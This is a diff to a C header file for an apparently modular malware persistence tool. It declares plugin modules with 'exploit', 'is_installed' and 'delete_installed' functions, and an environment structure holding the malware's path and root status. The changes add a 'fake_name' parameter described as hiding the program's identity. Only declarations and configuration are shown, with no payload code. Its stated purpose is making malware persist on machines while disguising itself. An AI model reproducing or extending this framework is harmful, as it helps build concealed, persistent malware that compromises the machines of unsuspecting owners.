@@ -5,21 +5,27 @@
 #pragma region Configuration
 
 	#ifdef __linux__
-		#define                 TARGET_OPERAING_SYSTEM              LINUX
-		#define                 MODULE_EXTENSION                    ".so"
+
+		#define        TARGET_OPERAING_SYSTEM            LINUX
+		#define        MODULE_EXTENSION                  ".so"
+
 	#elif _WIN32
-		#define                 TARGET_OPERAING_SYSTEM              WINDOWS
-		#define                 MODULE_EXTENSION                    ".dll"
+
+		#define        TARGET_OPERAING_SYSTEM            WINDOWS
+		#define        MODULE_EXTENSION                  ".dll"
+
 	#else
+
 		#error Platform not supported
+
 	#endif
 
-	#define                 MAX_MODULES                         32
-	#define                 MODULES_FOLDER                      "build/modules"
-	#define                 FUNC_NAME_IS_COMPATIBLE             "is_compatible"
-	#define                 FUNC_NAME_EXPLOIT                   "exploit"
-	#define                 FUNC_NAME_IS_INSTALLED              "is_installed"
-	#define                 FUNC_NAME_DELETE_INSTALLED          "delete_installed"
+	#define        MAX_MODULES                       32
+	#define        MODULES_FOLDER                    "build/modules"
+	#define        FUNC_NAME_IS_COMPATIBLE           "is_compatible"
+	#define        FUNC_NAME_EXPLOIT                 "exploit"
+	#define        FUNC_NAME_IS_INSTALLED            "is_installed"
+	#define        FUNC_NAME_DELETE_INSTALLED        "delete_installed"
 
 #pragma endregion
 
@@ -43,12 +49,18 @@
 	} ROOTED_STATE;
 
 	typedef struct{
-		OPERATING_SYSTEM operating_system;
-		ARCHITECTURE architecture;
-		ROOTED_STATE is_root;
+		char *fake_name;
 		char *malware_path;
 		char *working_directory;
+		ARCHITECTURE architecture;
+		OPERATING_SYSTEM operating_system;
+		ROOTED_STATE is_root;
 	} ENVIRONMENT;
+
+	typedef struct{
+		int count;
+		char **names;
+	} MODULE_WALLET;
 
 #pragma endregion
 
@@ -59,11 +71,6 @@
 #pragma endregion
 
 #pragma region Enumerations
-
-	typedef struct{
-		int count;
-		char **names;
-	} MODULE_WALLET;
 
 	typedef struct{
 		char *name;
@@ -77,7 +84,7 @@
 #pragma
 
 
-#pragma region ExportedFunctions
+#pragma region FunctionDeclarations
 
 
 	#pragma region Environment
@@ -90,17 +97,19 @@
 	 * @param arch The architecture of the machine
 	 * @param is_root True if the attacher has root on machine
 	 * @param abs_path_to_malware Absolute path to the malware that need to gain persistency
+	 * @param fake_name The aditional name of the program, used to hide its identity
 	 * @return int Zero if success, non-zero if error
 	 */
-	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware);
+	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware, char *fake_name);
 
 	/**
 	 * @brief Automatically set the machine details and the malware path
 	 * 
 	 * @param env The environment object that will be setted
+	 * @param fake_name The aditional name of the program, used to hide its identity
 	 * @return int Zero if success, non-zero if error
 	 */
-	int autoset_environment(ENVIRONMENT **env);
+	int autoset_environment(ENVIRONMENT **env, char *fake_name);
 
 	/**
 	 * @brief Free the already setted environment
